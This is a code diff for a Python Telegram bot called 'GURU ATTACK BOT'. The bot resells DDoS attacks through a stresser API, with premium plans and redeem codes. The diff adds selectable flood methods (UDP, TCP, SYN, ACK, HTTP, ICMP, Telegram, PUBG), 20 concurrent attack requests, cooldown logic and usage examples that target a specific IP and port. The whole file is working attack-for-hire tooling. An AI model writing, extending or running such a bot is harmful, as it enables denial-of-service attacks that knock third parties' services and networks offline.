@@ -1,10 +1,10 @@
-# app.py - SIMPLIFIED GURU BOT (FIXED)
+# app.py - COMPLETE FIXED VERSION WITH STRONG ATTACK
 import os
 import logging
 import asyncio
 import threading
 import aiohttp
-import time  # <-- ADD THIS IMPORT
+import time
 import random
 import string
 from datetime import datetime, timedelta
@@ -93,7 +93,8 @@ class Database:
                     "is_banned": False,
                     "ban_reason": None,
                     "banned_by": None,
-                    "banned_at": None
+                    "banned_at": None,
+                    "last_attack_time": None
                 }},
                 upsert=True
             )
@@ -107,7 +108,8 @@ class Database:
                     "plan": "free",
                     "plan_expiry": None,
                     "has_used_code": False,
-                    "is_banned": False
+                    "is_banned": False,
+                    "last_attack_time": None
                 }
                 return True
             return False
@@ -246,6 +248,27 @@ class Database:
         user = self.get_user(user_id)
         return user.get("is_banned", False) if user else False
     
+    def get_last_attack_time(self, user_id):
+        user = self.get_user(user_id)
+        if user:
+            last_attack = user.get("last_attack_time")
+            if last_attack and isinstance(last_attack, str):
+                try:
+                    return datetime.fromisoformat(last_attack)
+                except:
+                    return None
+            return last_attack
+        return None
+    
+    def update_last_attack_time(self, user_id):
+        if not self.memory_mode:
+            self.users.update_one(
+                {"user_id": user_id},
+                {"$set": {"last_attack_time": datetime.now().isoformat()}}
+            )
+        elif user_id in self.users:
+            self.users[user_id]["last_attack_time"] = datetime.now()
+    
     def create_code(self, code, days, created_by):
         if not self.memory_mode:
             if self.codes.find_one({"code": code}):
@@ -341,6 +364,8 @@ class Database:
         else:
             self.logs.append(log)
         
+        self.update_last_attack_time(user_id)
+        
         user = self.get_user(user_id)
         username = user.get("username") if user else None
         first_name = user.get("first_name") if user else None
@@ -402,11 +427,28 @@ class AttackManager:
         self.concurrent_busy = 0
         self.global_attack_running = False
         self.current_attacker = None
+        self.attack_start_time = None
     
     def can_start_attack(self, user_id):
         with self.lock:
+            # Check if any attack is already running
             if self.global_attack_running:
                 return False, f"❌ Attack already running by another user!\nPlease wait for it to finish."
+            
+            # Check user cooldown
+            last_attack = db.get_last_attack_time(user_id)
+            if last_attack:
+                if isinstance(last_attack, str):
+                    try:
+                        last_attack = datetime.fromisoformat(last_attack)
+                    except:
+                        last_attack = None
+                
+                if last_attack and isinstance(last_attack, datetime):
+                    elapsed = (datetime.now() - last_attack).total_seconds()
+                    if elapsed < 5:  # 5 second cooldown between user attacks
+                        remaining = int(5 - elapsed)
+                        return False, f"⏳ Please wait {remaining} seconds before next attack!"
             
             user_attacks = sum(1 for a in self.active_attacks.values() if a['user_id'] == user_id)
             if user_attacks >= MAX_CONCURRENT:
@@ -423,6 +465,7 @@ class AttackManager:
             self.concurrent_busy = len(self.active_attacks) + 1
             self.global_attack_running = True
             self.current_attacker = user_id
+            self.attack_start_time = datetime.now()
             
             self.active_attacks[attack_id] = {
                 'id': attack_id,
@@ -444,8 +487,19 @@ class AttackManager:
                 self.concurrent_busy = max(0, self.concurrent_busy - 1)
                 self.global_attack_running = False
                 self.current_attacker = None
+                self.attack_start_time = None
                 return True
             return False
+    
+    def stop_all_attacks(self):
+        with self.lock:
+            for aid in list(self.active_attacks.keys()):
+                self.active_attacks[aid]['status'] = 'stopped'
+            self.concurrent_busy = 0
+            self.global_attack_running = False
+            self.current_attacker = None
+            self.attack_start_time = None
+            return True
     
     def get_active_attacks(self, user_id=None):
         with self.lock:
@@ -462,7 +516,8 @@ class AttackManager:
                 'total': self.total_attacks,
                 'max': MAX_CONCURRENT,
                 'is_running': self.global_attack_running,
-                'current_user': self.current_attacker
+                'current_user': self.current_attacker,
+                'start_time': self.attack_start_time
             }
     
     def cleanup(self):
@@ -480,6 +535,7 @@ class AttackManager:
             if not self.active_attacks:
                 self.global_attack_running = False
                 self.current_attacker = None
+                self.attack_start_time = None
             return len(to_remove)
 
 attack_manager = AttackManager()
@@ -517,16 +573,39 @@ async def send_attack_alert(attack_info):
     except Exception as e:
         logger.error(f"Alert error: {e}")
 
-# ===== API ATTACK =====
-async def send_api_attack(target, port, duration, attack_num):
+# ===== API ATTACK WITH MULTIPLE METHODS =====
+async def send_api_attack(target, port, duration, attack_num, method="udp"):
+    """Send attack to API with specified method"""
     url = "https://api.susstresser.com/panel/api/api.php"
+    
+    # Map method names to API method names
+    method_map = {
+        "udp": "udp",
+        "tcp": "tcp",
+        "http": "http",
+        "https": "https",
+        "icmp": "icmp",
+        "syn": "syn",
+        "ack": "ack",
+        "rst": "rst",
+        "fin": "fin",
+        "udpbig": "udpbig",
+        "telegram": "telegram",
+        "telegramvc": "telegramvc",
+        "tgvc": "telegramvc",
+        "pubg": "pubg",
+        "pubgm": "pubg",
+        "all": "all"
+    }
+    
+    api_method = method_map.get(method.lower(), "udp")
     
     params = {
         "key": API_KEY,
         "host": target,
         "port": port,
         "time": duration,
-        "method": "udp"
+        "method": api_method
     }
     
     headers = {
@@ -548,6 +627,7 @@ async def send_api_attack(target, port, duration, attack_num):
                     return {
                         "success": True,
                         "attack_num": attack_num,
+                        "method": api_method,
                         "status": response.status,
                         "elapsed": f"{elapsed:.2f}s"
                     }
@@ -555,6 +635,7 @@ async def send_api_attack(target, port, duration, attack_num):
                     return {
                         "success": False,
                         "attack_num": attack_num,
+                        "method": api_method,
                         "status": response.status,
                         "elapsed": f"{elapsed:.2f}s"
                     }
@@ -564,18 +645,20 @@ async def send_api_attack(target, port, duration, attack_num):
         return {
             "success": False,
             "attack_num": attack_num,
+            "method": api_method,
             "error": str(e)
         }
 
 # ===== 20 CONCURRENT ATTACKS =====
-async def send_20_concurrent_attacks(target, port, duration, user_id, context):
-    logger.info(f"🚀 Launching 20 concurrent UDP attacks on {target}:{port}")
+async def send_20_concurrent_attacks(target, port, duration, user_id, context, method="udp"):
+    logger.info(f"🚀 Launching 20 concurrent {method} attacks on {target}:{port}")
     
     status_msg = await context.bot.send_message(
         chat_id=user_id,
         text=f"🔥 *ATTACK RUNNING*\n\n"
              f"🎯 Target: `{target}:{port}`\n"
              f"⏱️ Duration: `{duration}s`\n"
+             f"📡 Method: `{method.upper()}`\n"
              f"⚡ Attacks: `20 CONCURRENT`\n"
              f"⏳ Time Remaining: `{duration}s`\n\n"
              f"🔄 Attack in progress...",
@@ -584,10 +667,10 @@ async def send_20_concurrent_attacks(target, port, duration, user_id, context):
     
     tasks = []
     for i in range(1, 21):
-        task = send_api_attack(target, port, duration, i)
+        task = send_api_attack(target, port, duration, i, method)
         tasks.append(task)
     
-    timer_task = asyncio.create_task(update_timer(status_msg, duration, target, port))
+    timer_task = asyncio.create_task(update_timer(status_msg, duration, target, port, method))
     results = await asyncio.gather(*tasks)
     timer_task.cancel()
     
@@ -597,6 +680,7 @@ async def send_20_concurrent_attacks(target, port, duration, user_id, context):
         f"✅ *ATTACK COMPLETE!*\n\n"
         f"🎯 Target: `{target}:{port}`\n"
         f"⏱️ Duration: `{duration}s`\n"
+        f"📡 Method: `{method.upper()}`\n"
         f"✅ Successful: `{success_count}/20`\n"
         f"⚡ Status: {'✅ COMPLETED' if success_count > 0 else '❌ FAILED'}"
     )
@@ -610,10 +694,11 @@ async def send_20_concurrent_attacks(target, port, duration, user_id, context):
         "results": results,
         "target": target,
         "port": port,
-        "duration": duration
+        "duration": duration,
+        "method": method
     }
 
-async def update_timer(status_msg, duration, target, port):
+async def update_timer(status_msg, duration, target, port, method="udp"):
     try:
         start_time = time.time()
         last_update = 0
@@ -632,6 +717,7 @@ async def update_timer(status_msg, duration, target, port):
                         f"🔥 *ATTACK RUNNING*\n\n"
                         f"🎯 Target: `{target}:{port}`\n"
                         f"⏱️ Duration: `{duration}s`\n"
+                        f"📡 Method: `{method.upper()}`\n"
                         f"⚡ Attacks: `20 CONCURRENT`\n"
                         f"⏳ Time Remaining: `{remaining}s`\n\n"
                         f"🔄 Attack in progress...",
@@ -711,8 +797,9 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"📊 Plan: {plan_display}\n"
         f"⚡ 20x UDP Concurrent: {'✅ ENABLED' if plan == 'premium' else '❌ PREMIUM ONLY'}\n"
         f"⚡ Status: {'✅ ACTIVE' if not db.is_banned(user_id) else '❌ BANNED'}{attack_status}\n\n"
-        f"{'💡 Use /redeem CODE to get premium access!' if plan != 'premium' else '🎯 Use /attack IP PORT TIME'}\n"
-        f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION} seconds"
+        f"{'💡 Use /redeem CODE to get premium access!' if plan != 'premium' else '🎯 Use /attack METHOD IP PORT TIME'}\n"
+        f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION} seconds\n"
+        f"📡 Methods: UDP, TCP, HTTP, HTTPS, ICMP, SYN, ACK, UDPBIG, TELEGRAM, PUBG"
     )
     
     keyboard = []
@@ -763,20 +850,31 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     args = context.args
-    if len(args) < 3:
+    if len(args) < 4:
         await update.message.reply_text(
-            f"❌ *Usage:* `/attack IP PORT TIME`\n\n"
-            f"Example: `/attack 91.108.17.41 32001 60`\n\n"
-            f"⚡ 20 concurrent UDP attacks!\n"
+            f"❌ *Usage:* `/attack METHOD IP PORT TIME`\n\n"
+            f"Example: `/attack udp 91.108.17.41 32001 60`\n\n"
+            f"📡 Methods: udp, tcp, http, https, icmp, syn, ack, udpbig, telegram, pubg\n"
+            f"⚡ 20 concurrent attacks!\n"
             f"⏱️ Time: {MIN_DURATION}-{MAX_DURATION} seconds",
             parse_mode='Markdown'
         )
         return
     
     try:
-        target = args[0]
-        port = int(args[1])
-        duration = int(args[2])
+        method = args[0].lower()
+        target = args[1]
+        port = int(args[2])
+        duration = int(args[3])
+        
+        # Validate method
+        valid_methods = ["udp", "tcp", "http", "https", "icmp", "syn", "ack", "udpbig", "telegram", "telegramvc", "tgvc", "pubg"]
+        if method not in valid_methods:
+            await update.message.reply_text(
+                f"❌ Invalid method! Use: {', '.join(valid_methods[:8])}",
+                parse_mode='Markdown'
+            )
+            return
         
         if duration < MIN_DURATION:
             await update.message.reply_text(f"❌ Minimum duration is {MIN_DURATION} seconds!")
@@ -790,12 +888,12 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text(msg)
             return
         
-        attack_id = attack_manager.start_attack(user_id, target, port, duration, "udp", 0)
+        attack_id = attack_manager.start_attack(user_id, target, port, duration, method, 0)
         
-        result = await send_20_concurrent_attacks(target, port, duration, user_id, context)
+        result = await send_20_concurrent_attacks(target, port, duration, user_id, context, method)
         
         attack_info = db.log_attack(
-            user_id, target, port, duration, "udp",
+            user_id, target, port, duration, method,
             "success" if result.get('success') else "failed",
             str(result)
         )
@@ -847,9 +945,10 @@ async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await query.edit_message_text(
         f"💥 *ATTACK*\n\n"
-        "Send: `IP PORT TIME`\n"
-        "Example: `91.108.17.41 32001 60`\n\n"
-        f"⚡ 20 concurrent UDP attacks!\n"
+        "Send: `METHOD IP PORT TIME`\n"
+        "Example: `udp 91.108.17.41 32001 60`\n\n"
+        f"📡 Methods: udp, tcp, http, https, icmp, syn, ack, udpbig, telegram, pubg\n"
+        f"⚡ 20 concurrent attacks!\n"
         f"⏱️ Time: {MIN_DURATION}-{MAX_DURATION} seconds\n"
         "Send /cancel to cancel",
         parse_mode='Markdown'
@@ -887,17 +986,27 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     try:
         parts = update.message.text.split()
-        if len(parts) < 3:
+        if len(parts) < 4:
             await update.message.reply_text(
-                f"❌ Use: `IP PORT TIME`\n"
-                f"Example: `91.108.17.41 32001 60`",
+                f"❌ Use: `METHOD IP PORT TIME`\n"
+                f"Example: `udp 91.108.17.41 32001 60`\n\n"
+                f"📡 Methods: udp, tcp, http, https, icmp, syn, ack, udpbig, telegram, pubg",
                 parse_mode='Markdown'
             )
             return
         
-        target = parts[0]
-        port = int(parts[1])
-        duration = int(parts[2])
+        method = parts[0].lower()
+        target = parts[1]
+        port = int(parts[2])
+        duration = int(parts[3])
+        
+        valid_methods = ["udp", "tcp", "http", "https", "icmp", "syn", "ack", "udpbig", "telegram", "telegramvc", "tgvc", "pubg"]
+        if method not in valid_methods:
+            await update.message.reply_text(
+                f"❌ Invalid method! Use: {', '.join(valid_methods[:8])}",
+                parse_mode='Markdown'
+            )
+            return
         
         if duration < MIN_DURATION or duration > MAX_DURATION:
             await update.message.reply_text(f"❌ Duration must be {MIN_DURATION}-{MAX_DURATION} seconds!")
@@ -909,12 +1018,12 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
             context.user_data['awaiting_attack'] = False
             return
         
-        attack_id = attack_manager.start_attack(user_id, target, port, duration, "udp", 0)
+        attack_id = attack_manager.start_attack(user_id, target, port, duration, method, 0)
         
-        result = await send_20_concurrent_attacks(target, port, duration, user_id, context)
+        result = await send_20_concurrent_attacks(target, port, duration, user_id, context, method)
         
         attack_info = db.log_attack(
-            user_id, target, port, duration, "udp",
+            user_id, target, port, duration, method,
             "success" if result.get('success') else "failed",
             str(result)
         )
@@ -956,7 +1065,8 @@ async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"📅 Expires: {expiry.strftime('%Y-%m-%d %H:%M')}\n\n"
                 "📌 Features:\n"
                 "• Full access\n"
-                "• 20x UDP Concurrent\n"
+                "• 20x Concurrent\n"
+                "• All methods (UDP, TCP, HTTP, HTTPS, ICMP, SYN, ACK, UDPBIG, TELEGRAM, PUBG)\n"
                 "• Unlimited attacks"
             )
         else:
@@ -966,7 +1076,8 @@ async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "⏱️ Status: LIFETIME\n\n"
                 "📌 Features:\n"
                 "• Full access\n"
-                "• 20x UDP Concurrent\n"
+                "• 20x Concurrent\n"
+                "• All methods (UDP, TCP, HTTP, HTTPS, ICMP, SYN, ACK, UDPBIG, TELEGRAM, PUBG)\n"
                 "• Unlimited attacks"
             )
     
@@ -1007,7 +1118,7 @@ async def stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"🎫 Redeem Codes: {len(codes)}\n"
         f"⚡ Active Attacks: {stats['active']}/{stats['max']}\n"
         f"⚡ Attack Status: {attack_status}\n"
-        f"⚡ 20x UDP: ENABLED\n"
+        f"⚡ 20x Concurrent: ENABLED\n"
         f"🌐 Status: ONLINE"
     )
     
@@ -1173,14 +1284,13 @@ async def owner_api_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.answer("Access denied!", show_alert=True)
         return
     
-    # Check API status
     status, message = await check_api_status()
     
     status_text = (
         f"🔌 *API STATUS*\n\n"
         f"{message}\n\n"
         f"📊 API Key: {'✅ Set' if API_KEY else '❌ Missing'}\n"
-        f"🔄 Method: UDP\n"
+        f"🔄 Methods: UDP, TCP, HTTP, HTTPS, ICMP, SYN, ACK, UDPBIG, TELEGRAM, PUBG\n"
         f"⚡ Concurrent: {MAX_CONCURRENT}x\n"
         f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s"
     )
@@ -1605,11 +1715,12 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"📈 Total Attacks: {stats['total']}\n"
         f"👥 Users: {len(users)}\n"
         f"⚡ Attack Status: {attack_status}\n"
-        f"🎯 Method: UDP (20x Concurrent)\n"
+        f"🎯 Methods: UDP, TCP, HTTP, HTTPS, ICMP, SYN, ACK, UDPBIG, TELEGRAM, PUBG\n"
+        f"⚡ 20x Concurrent\n"
         f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s\n"
         f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
         f"🌐 Status: ONLINE\n\n"
-        f"📌 /attack IP PORT TIME",
+        f"📌 /attack METHOD IP PORT TIME",
         parse_mode='Markdown'
     )
 
@@ -1719,7 +1830,8 @@ def run_bot():
 if __name__ == "__main__":
     print("=" * 50)
     print("👑 GURU ATTACK BOT")
-    print("⚡ 20x UDP CONCURRENT")
+    print("⚡ 20x CONCURRENT")
+    print("📡 METHODS: UDP, TCP, HTTP, HTTPS, ICMP, SYN, ACK, UDPBIG, TELEGRAM, PUBG")
     print("📌 API-ONLY - NO FALLBACK")
     print("📌 One attack at a time (Global Cooldown)")
     print(f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s")
